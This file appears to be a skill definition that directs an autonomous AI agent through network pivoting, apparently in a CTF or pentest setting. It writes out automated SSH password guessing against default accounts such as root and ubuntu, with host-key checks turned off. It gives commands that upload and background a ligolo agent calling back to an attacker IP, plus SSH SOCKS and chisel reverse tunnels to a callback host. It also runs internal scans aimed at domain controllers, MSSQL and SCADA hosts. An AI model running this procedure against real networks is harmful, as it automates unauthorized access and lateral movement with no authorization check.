---
name: pivot
description: "Pivot/Tunneling autonomous skill: automatic segment detection from a single pivot IP, automatic SSH credential attempts, tunnel establishment (ligolo/ssh/chisel), internal network host/port discovery, and automatic MCP reflection (add_host/update_host/import_scan_data)."
argument-hint: "<pivot_ip>"
---

# Pivot/Tunneling Autonomous Skill

Target: `$ARGUMENTS`

Argument parsing rules:
- 1st: `pivot_ip` (required) -- pivot host IP
- No additional arguments accepted. `target_cidr`, `username`, `password` are all determined automatically.

---

## Objective

1. Establish a tunnel to the pivot host.
2. Automatically select the internal segment to explore.
3. Scan the internal segment and update the MCP DB.
   - Primary: `import_scan_data`
   - Supplementary: `add_host` for new hosts, `update_host` for existing host info updates
4. Record the pivot route with `add_pivot_route`/`update_pivot_route`.
5. Reflect the pivot host's route/interface IPs using the dedicated skill (`/update-host-routes <pivot_ip>`).

---

## Mixed Tunnel Operation Rules (Mandatory)

`ligolo` and `ssh -D` (SOCKS) can be used simultaneously. However, the following rules are enforced:

1. Maintain a fixed mapping of `segment -> tunnel_mode`.
   - Example: `10.1.3.0/24 -> ligolo`, `10.1.4.0/24 -> socks`
   - Only reconfigure when changing the mode for a segment.
2. Automatically clean up same-CIDR route conflicts.
   - Before using ligolo / on reconfiguration: `./scripts/pivot/ligolo-route.sh up <cidr>`
   - When tearing down ligolo: `./scripts/pivot/ligolo-route.sh down <cidr>`
3. Branch command execution through mode-based wrappers.
   - `ligolo` mode: direct execution
   - `socks/chisel` mode: execute with `proxychains4 -q`
4. In `socks/chisel` mode, use only TCP-based scanning/access.
   - Allowed: `nmap -sT`, HTTP/SMB/MSSQL and other TCP clients
   - Not recommended/prohibited: ICMP/UDP/raw-socket dependent scans
5. Include tunnel information in MCP records.
   - Include `segment=<cidr>;mode=<mode>` in the `notes` field of `add_pivot_route`/`update_pivot_route`
   - Reflect `reachable-via=<mode>` in `update_host` notes

---

## Phase 0: Context Load

1. Call `get_sitrep`.
2. If no active session exists, `start_session(title="Pivot: <pivot_ip>")`.
3. Check if `pivot_ip` exists in `ctf://hosts`:
   - If not, `add_host(ip=pivot_ip, status="up", notes="pivot candidate")`
   - If it exists, `update_host` with latest information
4. `heartbeat(sessionId)`.

---

## Phase 1: Automatic target_cidr Detection

Automatically select `target_cidr` using the following priority:

1. Prefer `reachable=false` segments from `get_sitrep.segments`
2. If SSH access to the pivot host succeeds, extract private network CIDRs from `ip route` output
   - Exclude CIDRs already reachable from the attacker
   - Exclude the local segment the pivot belongs to
   - Reflect route/interface IPs using the dedicated skill: `/update-host-routes <pivot_ip>`
3. If still none found, record the reason with `add_note` and terminate

If the segment is not in the DB:
- `add_segment(name=<cidr>, cidr=<cidr>)`
- If not yet directly accessible, maintain `update_segment_reachability(reachable=false)`

---

## Phase 2: Automatic SSH Account/Password Attempts

Automatically generate combinations from MCP credentials for `pivot_ip`:

1. `valid/untested` SSH/unknown credentials with host access for that host
2. Credentials where `linkedService in (ssh, web/ssh, web)`
3. Exclude hash/ticket material (`secretType in [hash, ntlm, ticket, aes256]`) from password SSH attempt targets
4. Exclude password-type credentials (`secretType=password`) that look like hashes (32/40/64 hex)
5. Username priority:
   - Usernames from credentials
   - Default candidates: `ec2-user`, `ubuntu`, `admin`, `root`, `webmaster`, `svc_web`

Briefly test each combination:

```bash
sshpass -p '<password>' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 <username>@<pivot_ip> 'id; hostname'
```

On success:
- Record the used combination with `test_credential_access(protocol="ssh", status="valid")`
- Record failed combinations as `status="invalid"` when needed

If no SSH combination is found:
- If a webshell/other channel exists, attempt the chisel route
- If neither exists, `request_task(type="manual", title="Need pivot access credential")`

---

## Phase 3: Tunnel Establishment (Fixed Priority)

### 3-1. ligolo-ng (Priority 1)

Conditions:
- SSH access succeeded
- Outbound connection from the pivot host to the attacker is possible

```bash
# Attack machine (assuming the user has already run this once)
# Do not re-run; only verify the LISTEN state
lsof -nP -iTCP:11601 -sTCP:LISTEN

# Pivot host
sshpass -p '<password>' scp $BINS/linux-amd64/ligolo-agent <username>@<pivot_ip>:/tmp/agent
sshpass -p '<password>' ssh <username>@<pivot_ip> "chmod +x /tmp/agent && nohup /tmp/agent -connect <attacker_ip>:11601 -ignore-cert >/tmp/ligolo.log 2>&1 &"

# Attack machine: start tunnel via API (= session/start automation)
# Default credentials: ligolo/password (change LIGOLO_USER/LIGOLO_PASS if needed)
./scripts/pivot/ligolo-tunnel.sh start <pivot_ip> <utunX> <target_cidr>
```

On success:
- `add_pivot_route(protocol="ligolo", port=11601, status="active")`
- Include `segment=<target_cidr>;mode=ligolo` in `notes`
- Clean up local routes using the following instead of manual `route add/delete`:
```bash
./scripts/pivot/ligolo-route.sh up <target_cidr>
```

### 3-2. SSH SOCKS (-D, Priority 2)

If ligolo fails:

```bash
sshpass -p '<password>' ssh -o StrictHostKeyChecking=no -D 1080 -N -f <username>@<pivot_ip>
```

On success:
- `add_pivot_route(protocol="ssh", port=22, status="active", notes="SOCKS 1080")`
- Include `segment=<target_cidr>;mode=socks` in `notes`

### 3-3. chisel (Priority 3)

When SSH is unavailable and only an HTTP path is possible:

```bash
# Callback host baseline check
ssh root@<CALLBACK_IP> 'ss -lntp | grep ":8443 "'

# Callback host working root
# /var/lib/pixel/{bin,payloads,logs,tmp}

# Pivot (via shell)
chisel client <CALLBACK_IP>:8443 R:socks
```

On success:
- `add_pivot_route(protocol="chisel", port=8443, status="active")`
- Include `segment=<target_cidr>;mode=chisel` in `notes`

If all tunnels fail:
- `log_event(type="note", message="pivot tunnel failed ...")`
- `request_task(type="manual", title="Pivot tunnel setup assistance")`

---

## Phase 4: Internal Network Scan + Automatic Host Reflection

For the selected `target_cidr`:

0. First determine the `segment -> tunnel_mode` and select the execution wrapper:
```bash
# mode=ligolo
run_cmd() { "$@"; }

# mode=socks/chisel
run_cmd() { proxychains4 -q "$@"; }
```

1. Use script-based JSON scanning when possible:
```bash
if [ "$mode" = "socks" ] || [ "$mode" = "chisel" ]; then
  proxychains4 -q uv run scripts/recon/scan_and_import.py -t <target_cidr> --proxy-mode -w 8
else
  uv run scripts/recon/scan_and_import.py -t <target_cidr> -w 8
fi
```

2. For discovered high-value hosts (e.g., DC, MSSQL, SCADA), perform full port + deep service scan:
```bash
if [ "$mode" = "socks" ] || [ "$mode" = "chisel" ]; then
  proxychains4 -q uv run scripts/recon/scan_and_import.py -t <host_ip>/32 --proxy-mode --deep --full-ports -w 4
else
  uv run scripts/recon/scan_and_import.py -t <host_ip>/32 --deep --full-ports -w 4
fi
```

3. If the importer cannot be used (e.g., proxy constraints/interruption):
- `add_host` for actually confirmed new IPs
- `update_host(notes/os/hostname)` for existing hosts

4. After scanning:
- `update_segment_reachability(target_segment, reachable=true)` (set to true if access is now possible via tunnel)
- `log_event(type="scan", ... )`
- `heartbeat(sessionId)`

---

## Phase 5: Completion

1. Verify the route with `get_pivot_chain(target=<target_cidr>)`
2. `log_session_entry(type="result", content="Pivot complete: <pivot_ip> -> <target_cidr>")`
3. Check next actions with `get_sitrep`

---

## Key Rules

- Input accepts **only a single IP**: `/pivot <pivot_ip>`
- `target_cidr`, `username`, `password` are auto-detected/auto-attempted
- ligolo `session/start` is automated via `./scripts/pivot/ligolo-tunnel.sh start ...` instead of manual console input.
- Always `add_host` when new hosts are discovered
- Always `update_host` when new information is found for existing hosts
- Registration based on assumptions/memory is prohibited; only reflect actually confirmed data
